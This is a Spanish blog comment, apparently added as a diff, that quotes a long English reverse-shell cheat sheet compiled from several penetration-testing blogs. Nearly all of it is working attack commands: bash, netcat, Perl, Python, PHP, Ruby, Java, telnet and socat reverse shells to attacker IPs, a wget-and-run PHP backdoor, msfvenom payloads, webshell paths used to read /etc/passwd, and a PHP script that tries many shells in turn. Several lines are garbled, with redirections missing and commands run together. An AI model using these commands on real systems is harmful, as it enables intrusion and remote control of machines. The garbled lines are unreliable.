@@ -1,0 +1,294 @@
+<p>O bien puedo soltarle esto:</p>
+<blockquote><p><b>Shells &amp; Reverse</b></p>
+<p>Here’s how to upgrade your Linux reverse shell.<br>
+python -c “import pty; pty.spawn(‘/bin/bash’)”</p>
+<p>You should get a nicer looking prompt, but your job isn’t over yet. Press Ctrl+Z to background your reverse shell, then in your local machine run:</p>
+<p>stty raw -echo<br>
+fg</p>
+<p>Things are going to look really messed up at this point, but don’t worry.</p>
+<p>Just type reset and hit return. You should be presented with a fully interactive shell. You’re welcome.</p>
+<p>There’s still one little niggling thing that can happen, the shell might not be the correct height/width for your terminal. To fix this, go to your local machine and run:</p>
+<p>stty size</p>
+<p>This should return two numbers, which are the number of rows and columns in your terminal. For example’s sake let’s say this command returned 48 120 Head on back to your victim box’s shell and run the following.</p>
+<p>stty -rows 48 -columns 120</p>
+<p>You now have a beautiful interactive shell to brag about.</p>
+<p>Src: <a href="https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97" rel="nofollow">https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97</a></p>
+<p>ALSO (or the same):<br>
+For the longest time when I got reverse shells I would suffer through using non-interactive shells until I learned about upgrading to interactive shells from IppSec:<br>
+python -c ‘import pty;pty.spawn(“/bin/bash”);’<br>
+CTRL-Z<br>
+stty raw -echo<br>
+fg<br>
+ENTER<br>
+Src: <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" rel="nofollow">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
+<p>Netcat<br>
+NOTE: Most versions of netcat don’t have -e built-in<br>
+If you’re not sure what -e does, it lets you specify a command to pipe through your reverse shell. There’s a good reason that it’s disabled on most versions of netcat — it’s a gaping security hole. Having said that, if you’re attacking a linux machine, you can get around this by using the following reverse shell one-liner.</p>
+<p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</p>
+<p>Which will pipe /bin/sh back to 10.0.0.1 on port 1234, without using the -e switch. This brings us to the next section nicely:</p>
+<p>Src: <a href="https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97" rel="nofollow">https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97</a></p>
+<p>This brings us to the next section nicely:</p>
+<p>A collection of Linux reverse shell one-liners</p>
+<p>These one-liners are all found on pentestmonkey.net. This website also contains a bunch of other useful stuff!</p>
+<p>Bash</p>
+<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
+<p>Perl</p>
+<p>perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
+<p>Python</p>
+<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
+<p>PHP</p>
+<p>php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &amp;3 2&gt;&amp;3”);’</p>
+<p>Ruby</p>
+<p>ruby -rsocket -e’f=TCPSocket.open(“10.0.0.1”,1234).to_i;exec sprintf(“/bin/sh -i &amp;%d 2&gt;&amp;%d”,f,f,f)’</p>
+<p>Netcat with -e</p>
+<p>nc -e /bin/sh 10.0.0.1 1234</p>
+<p>Netcat without -e (my personal favourite)</p>
+<p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</p>
+<p>Java</p>
+<p>r = Runtime.getRuntime()<br>
+p = r.exec([“/bin/bash”,”-c”,”exec 5/dev/tcp/10.0.0.1/2002;cat &amp;5 &gt;&amp;5; done”] as String[])<br>
+p.waitFor()</p>
+<p>Src: <a href="https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97" rel="nofollow">https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97</a></p>
+<p>Breaking Out of Limited Shells<br>
+Credit to G0tmi1k for these (or wherever he stole them from!).<br>
+The Python trick:<br>
+python -c ‘import pty;pty.spawn(“/bin/bash”)’<br>
+echo os.system(‘/bin/bash’)<br>
+/bin/sh -i<br>
+Src: <a href="https://highon.coffee/blog/linux-commands-cheat-sheet/" rel="nofollow">https://highon.coffee/blog/linux-commands-cheat-sheet/</a></p>
+<p>Src: <a href="https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/" rel="nofollow">https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</a></p>
+<p>#1. netcat</p>
+<p>Surprise!!! Nothing new here. Plain and simple. Fire up a listener on the attacker machine on a port which is reachable from the target and connect back to the listener with netcat. Looks like this.</p>
+<p>images\1-1.png</p>
+<p>#2. netcat with GAPING_SECURITY_HOLE disabled:</p>
+<p>This is a little trick that Ed Skoudis tweeted about in November of last year, but I haven’t seen it widely publicized. It is based on the common technique used to build netcat relays. When the GAPING_SECURITY_HOLE is disabled, which means you don’t have access to the ‘-e’ option of netcat, most people pass on using netcat and move to something else. Well this just isn’t necessary. Create a FIFO file system object and use it as a backpipe to relay standard output from commands piped from netcat to /bin/bash back into netcat. Sounds confusing right? The following image should clear things up.</p>
+<p>images\1-2.png</p>
+<p>#3. netcat without netcat:</p>
+<p>I love “hacks” that use features of the operating system against itself. This is one of those “hacks”. It takes the /dev/tcp socket programming feature and uses it to redirect /bin/bash to a remote system. It’s not always available, but can be quite handy when it is.</p>
+<p>images\1-3.png</p>
+<p>#4. netcat without netcat or /dev/tcp:</p>
+<p>/dev/tcp not available either? Just use telnet with technique #2.</p>
+<p>images\1-4.png</p>
+<p>#5. telnet-to-telnet:</p>
+<p>I’m not sure why you’d use this technique, but it’s an option, so here it is nonetheless. This is clearly the ugliest of the techniques. This technique uses two telnet sessions connected to remote listeners to pipe input from one telnet session to /bin/bash, and pipe the output to the second telnet session. Commands are entered into one the of the attackers listeners and feedback is received on the other.</p>
+<p>images\1-5.png</p>
+<p>#6. RCE shell:</p>
+<p>On this one I’m cheating a little bit. This applies to Remote Command Execution vulnerabilities only. Rather than manually enter commands into a proxy or browser url, I wrote small python script which gives you the feel of a shell, without spawning anything in reverse from the target. You merely pass the script the vulnerable url with the injectable field replaced with the ” tag and it presents you with a clean interface for entering commands. In the background, the script is making the request to the web server, parsing the response, and presenting it to you.</p>
+<p>images\1-6.png</p>
+<p>#7. PHP reverse shell via interactive console:</p>
+<p>The last technique makes use of the php interactive console. The attacker issues one command which moves to the /tmp directory (because it is typically world writable), uses wget to download a malicious php reverse_tcp backdoor (which the attacker hosts on a web server that he controls), and executes the backdoor via the interactive console.</p>
+<p>images\1-7.png</p>
+<p>#1<br>
+nc   -e /bin/bash<br>
+#2<br>
+mknod backpipe p; nc   0backpipe<br>
+#3<br>
+/bin/bash -i &gt; /dev/tcp// 0&amp;1<br>
+#4<br>
+mknod backpipe p; telnet   0backpipe<br>
+#5<br>
+telnet   | /bin/bash | telnet<br>
+#7<br>
+wget -O /tmp/bd.php  &amp;&amp; php -f /tmp/bd.php</p>
+<p>Src: <a href="https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/" rel="nofollow">https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</a></p>
+<p>Src: <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" rel="nofollow">https://highon.coffee/blog/reverse-shell-cheat-sheet/</a></p>
+<p>During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive shell.<br>
+Below are a collection of reverse shells that use commonly installed programming languages, or commonly installed binaries (nc, telnet, bash, etc). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux.<br>
+If you found this resource usefull you should also check out our penetration testing tools cheat sheet which has some additional reverse shells and other commands useful when performing penetration testing.</p>
+<p>Setup Listening Netcat</p>
+<p>Your remote shell will need a listening netcat instance in order to connect back.</p>
+<p>Set your Netcat listening shell on an allowed port</p>
+<p>Use a port that is likely allowed via outbound firewall rules on the target network, e.g. 80 / 443<br>
+To setup a listening netcat instance, enter the following:<br>
+root@kali:~# nc -nvlp 80<br>
+nc: listening on :: 80 …<br>
+nc: listening on 0.0.0.0 80 …<br>
+NAT requires a port forward</p>
+<p>If you’re attacking machine is behing a NAT router, you’ll need to setup a port forward to the attacking machines IP / Port.<br>
+ATTACKING-IP is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above).</p>
+<p>Bash Reverse Shells</p>
+<p>exec /bin/bash 0&amp;0 2&gt;&amp;00&lt;&amp;196;exec 196/dev/tcp/ATTACKING-IP/80; sh &amp;196 2&gt;&amp;196exec 5/dev/tcp/ATTACKING-IP/80<br>
+cat &amp;5 &gt;&amp;5; done</p>
+<p># or:</p>
+<p>while read line 0&amp;5 &gt;&amp;5; donebash -i &gt;&amp; /dev/tcp/ATTACKING-IP/80 0&gt;&amp;1<br>
+PHP Reverse Shell</p>
+<p>A useful PHP reverse shell:<br>
+php -r ‘$sock=fsockopen(“ATTACKING-IP”,80);exec(“/bin/sh -i &amp;3 2&gt;&amp;3″);’<br>
+(Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)<br>
+Netcat Reverse Shell</p>
+<p>Useful netcat reverse shell examples:<br>
+nc -e /bin/sh ATTACKING-IP 80/bin/sh | nc ATTACKING-IP 80rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc ATTACKING-IP 4444 0/tmp/p<br>
+Telnet Reverse Shell</p>
+<p>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/ptelnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443Remember to listen on 443 on the attacking machine also.</p>
+<p>Perl Reverse Shell</p>
+<p>perl -e ‘use Socket;$i=”ATTACKING-IP”;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br>
+Perl Windows Reverse Shell</p>
+<p>perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”ATTACKING-IP:80″);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while;’perl -e ‘use Socket;$i=”ATTACKING-IP”;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br>
+Ruby Reverse Shell</p>
+<p>ruby -rsocket -e’f=TCPSocket.open(“ATTACKING-IP”,80).to_i;exec sprintf(“/bin/sh -i &amp;%d 2&gt;&amp;%d”,f,f,f)’<br>
+Java Reverse Shell</p>
+<p>r = Runtime.getRuntime()<br>
+p = r.exec([“/bin/bash”,”-c”,”exec 5/dev/tcp/ATTACKING-IP/80;cat &amp;5 &gt;&amp;5; done”] as String[])<br>
+p.waitFor()<br>
+Python Reverse Shell</p>
+<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ATTACKING-IP”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’<br>
+Gawk Reverse Shell</p>
+<p>#!/usr/bin/gawk -f</p>
+<p>BEGIN {<br>
+Port = 8080<br>
+Prompt = “bkd&gt; ”</p>
+<p>Service = “/inet/tcp/” Port “/0/0”<br>
+while (1) {<br>
+do {<br>
+printf Prompt |&amp; Service<br>
+Service |&amp; getline cmd<br>
+if (cmd) {<br>
+while ((cmd |&amp; getline) &gt; 0)<br>
+print $0 |&amp; Service<br>
+close(cmd)<br>
+}<br>
+} while (cmd != “exit”)<br>
+close(Service)<br>
+}<br>
+}<br>
+Kali Web Shells</p>
+<p>The following shells exist within Kali Linux, under /usr/share/webshells/ these are only useful if you are able to upload, inject or transfer the shell to the machine.</p>
+<p>Kali PHP Web Shells</p>
+<p>Kali PHP reverse shells and command shells:<br>
+Command Description<br>
+/usr/share/webshells/php/ php-reverse-shell.php     Pen Test Monkey – PHP Reverse Shell<br>
+/usr/share/webshells/ php/php-findsock-shell.php /usr/share/webshells/ php/findsock.c   Pen Test Monkey, Findsock Shell. Build gcc -o findsock findsock.c (be mindfull of the target servers architecture), execute with netcat not a browser nc -v target 80<br>
+/usr/share/webshells/ php/simple-backdoor.php   PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: <a href="http://target.com/simple-" rel="nofollow">http://target.com/simple-</a> backdoor.php?cmd=cat+/etc/passwd<br>
+/usr/share/webshells/ php/php-backdoor.php  Larger PHP shell, with a text input box for command execution.</p>
+<p>Tip: Executing Reverse Shells</p>
+<p>The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.</p>
+<p>Kali Perl Reverse Shell</p>
+<p>Kali perl reverse shell:<br>
+Command Description<br>
+/usr/share/webshells/perl/ perl-reverse-shell.pl    Pen Test Monkey – Perl Reverse Shell<br>
+/usr/share/webshells/ perl/perlcmd.cgi  Pen Test Monkey, Perl Shell. Usage: <a href="http://target.com/perlcmd.cgi?cat" rel="nofollow">http://target.com/perlcmd.cgi?cat</a> /etc/passwd</p>
+<p>Kali Cold Fusion Shell</p>
+<p>Kali Coldfusion Shell:<br>
+Command Description<br>
+/usr/share/webshells/cfm/cfexec.cfm     Cold Fusion Shell – aka CFM Shell</p>
+<p>Kali ASP Shell</p>
+<p>Classic ASP Reverse Shell + CMD shells:<br>
+Command Description<br>
+/usr/share/webshells/asp/   Kali ASP Shells</p>
+<p>Kali ASPX Shells</p>
+<p>ASP.NET reverse shells within Kali:<br>
+Command Description<br>
+/usr/share/webshells/aspx/  Kali ASPX Shells</p>
+<p>Kali JSP Reverse Shell</p>
+<p>Kali JSP Reverse Shell:<br>
+Command Description<br>
+/usr/share/webshells/jsp/jsp-reverse.jsp    Kali JSP Reverse Shell</p>
+<p>Src: <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" rel="nofollow">https://highon.coffee/blog/reverse-shell-cheat-sheet/</a></p>
+<p>Src: <a href="https://evi1us3r.wordpress.com/reverse-shell-cheat-sheet/" rel="nofollow">https://evi1us3r.wordpress.com/reverse-shell-cheat-sheet/</a></p>
+<p>Reverse Shell Cheat Sheet</p>
+<p>Netcat:<br>
+nc 192.168.1.10 443 -e /bin/bash<br>
+/bin/sh | nc 192.168.1.10 443<br>
+rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc 192.168.1.10 443 0/tmp/p<br>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f<br>
+Bash:<br>
+bash -i &gt;&amp; /dev/tcp/192.168.1.10/443 0&gt;&amp;1<br>
+/bin/bash -i &gt; /dev/tcp/192.168.1.10/443 0&amp;1<br>
+0&lt;&amp;196;exec 196/dev/tcp/192.168.1.10/443; sh &amp;196 2&gt;&amp;196<br>
+exec 5/dev/tcp/192.168.1.10/443<br>
+cat &amp;5 &gt;&amp;5; done<br>
+exec 5/dev/tcp/192.168.1.10/443<br>
+cat &lt;&amp;5 | while read line 0&amp;5 &gt;&amp;5; done<br>
+Python:<br>
+python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.10”,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’<br>
+Perl:<br>
+*nix:<br>
+perl -e ‘use Socket;$i=”192.168.1.10″;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br>
+Windows:<br>
+perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”192.168.1.10-IP:443″);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while;’<br>
+perl -e ‘use Socket;$i=”192.168.1.10″;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br>
+PHP:<br>
+php -r ‘$sock=fsockopen(“192.168.1.10”,443);exec(“/bin/sh -i &amp;3 2&gt;&amp;3”);’<br>
+Ruby:<br>
+ruby -rsocket -e’f=TCPSocket.open(“192.168.1.10”,443).to_i;exec sprintf(“/bin/sh -i &amp;%d 2&gt;&amp;%d”,f,f,f)’<br>
+Windows<br>
+ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’<br>
+Java:<br>
+r = Runtime.getRuntime()<br>
+p = r.exec([“/bin/bash”,”-c”,”exec 5/dev/tcp/192.168.1.10/443;cat &amp;5 &gt;&amp;5; done”] as String[])<br>
+p.waitFor()<br>
+Telnet:<br>
+rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet 192.168.1.10 443 0/tmp/p<br>
+telnet 192.168.1.10 443 | /bin/bash | telnet 192.168.1.10 443</p>
+<p>Src: <a href="https://evi1us3r.wordpress.com/reverse-shell-cheat-sheet/" rel="nofollow">https://evi1us3r.wordpress.com/reverse-shell-cheat-sheet/</a></p>
+<p>Ejecutar comandos con privilegios de usuarios sin shell (nologin / false)</p>
+<p>Usuarios sin shell (nologin).<br>
+grep -i nologin /etc/passwd</p>
+<p>bin:x:1:1:bin:/bin:/sbin/nologin<br>
+daemon:x:2:2:daemon:/sbin:/sbin/nologin<br>
+apache:x:48:48:Apache:/var/www:/sbin/nologin<br>
+ntp:x:38:38::/etc/ntp:/sbin/nologin</p>
+<p>Ejecutar shell con el usuario apache (configurado con nologin).<br>
+su -s /bin/bash apache</p>
+<p>bash-4.1$ id<br>
+uid=48(apache) gid=48(apache) groups=48(apache)</p>
+<p>Src: <a href="https://www.busindre.com/comandos_como_usuarios_sin_shell_nologin" rel="nofollow">https://www.busindre.com/comandos_como_usuarios_sin_shell_nologin</a></p>
+<p>Breaking out of shells</p>
+<p>• Non-interactive shells<br>
+to break out of non-interactive mode: in /tmp folder<br>
+echo “import pty; pty.spawn(‘/bin/bash’)” &gt; /tmp/test.py<br>
+python /tmp/test.py<br>
+• upgrade non-tty to tty: python -c ‘import pty;pty.spawn(“/bin/sh”)’<br>
+• Escape limited shell<br>
+echo os.system(‘/bin/sh’) OR echo os.system(‘/bin/bash’)</p>
+<p>Kali webshells<br>
+• /usr/share/webshells/php/php-reverse-shell.php<br>
+• /usr/share/webshells/cfm/cfexec.cfm<br>
+• /usr/share/webshells/perl/perl-reverse-shell.pl</p>
+<p>ASP<br>
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.168.168 LPORT=443 -f asp -o shell.asp – also works for exporting .aspx</p>
+<p>Reverse connections<br>
+• echo $secpasswd = ConvertTo-SecureString “password” -AsPlainText -Force &gt; wget-runas.ps1<br>
+echo $mycreds = New-Object System.Management.Automation.PSCredential (“username”, $secpasswd) &gt;&gt; wget-runas.ps1<br>
+echo $computer = “hostname” &gt;&gt; wget-runas.ps1<br>
+echo [System.Diagnostics.Process]::Start(“C:\tmp\nc.exe”,”192.168.168.168 443 -e cmd.exe”, $mycreds.Username, $mycreds.Password, $computer) &gt;&gt; wget-runas.ps1<br>
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget-runas.ps1<br>
+• Linux: os.system(‘nc 192.168.168.168 443 -e /bin/sh’)<br>
+• Windows: nc -nlvp 443 -e cmd.exe</p>
+<p>Src: <a href="https://blackwintersecurity.com/tools/" rel="nofollow">https://blackwintersecurity.com/tools/</a></p>
+<p>PHP<br>
+Reverse shells<br>
+• One line: /bin/bash -i &gt; /dev/tcp/192.168.168.169/443 0&amp;1<br>
+• MSFvenom syntax: msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.168 LPORT=443 R &gt; revshell.php</p>
+<p>Src: <a href="https://blackwintersecurity.com/tools/" rel="nofollow">https://blackwintersecurity.com/tools/</a></p>
+<p>Execution through PHP webshell</p>
+<p>•<br>
+•<br>
+•<br>
+•<br>
+• </p>
+<p>Shell reversa / inversa mediante una conexión cifrada con socat<br>
+ Host que espera la conexión de la shell reversa (atacante):</p>
+<p>openssl req -sha512 -new -x509 -days 365 -nodes -out cert.pem -keyout cert.pem<br>
+socat `tty`,raw,echo=0 openssl-listen:1999,reuseaddr,cert=cert.pem,verify=0</p>
+<p> Host que envía la shell al servidor del atacante (X.X.X.X):</p>
+<p>socat openssl-connect:X.X.X.X:1999,verify=0 exec:bash,pty,stderr,setsid</p>
+<p>Src: <a href="https://www.busindre.com/shell_reversa_cifrada_con_socat" rel="nofollow">https://www.busindre.com/shell_reversa_cifrada_con_socat</a></p>
+<p>Best PHP Reverse Shell (from Guifre):</p>
+<p> /dev/tcp/’.$ip.’/’.$port.’ 0&amp;1′,<br>
+    ‘0&lt;&amp;196;exec 196/dev/tcp/’.$ip.’/’.$port.’; /bin/sh &amp;196 2&gt;&amp;196′,<br>
+    ‘/usr/bin/nc ‘.$ip.’ ‘.$port.’ -e /bin/bash’,<br>
+    ‘nc.exe -nv ‘.$ip.’ ‘.$port.’ -e cmd.exe’,<br>
+    “/usr/bin/perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\””.$ip.”:”.$port.”\”);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while;'”,<br>
+    ‘rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ‘.$ip.’ ‘.$port.’ 0/tmp/p’,<br>
+    ‘perl -e \’use Socket;$i=”‘.$ip.'”;$p=’.$port.’;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};\”<br>
+);<br>
+foreach ($reverse_shells as $reverse_shell) {<br>
+   try {echo system($reverse_shell);} catch (Exception $e) {echo $e;}<br>
+   try {shell_exec($reverse_shell);} catch (Exception $e) {echo $e;}<br>
+   try {exec($reverse_shell);} catch (Exception $e) {echo $e;}<br>
+}<br>
+system(‘id’);<br>
+?&gt;
+</p></blockquote>
+<p>¿Se entiende mejor así? <img draggable="false" class="emoji" alt="🙄" src="https://s0.wp.com/wp-content/mu-plugins/wpcom-smileys/twemoji/2/svg/1f644.svg" scale="0">
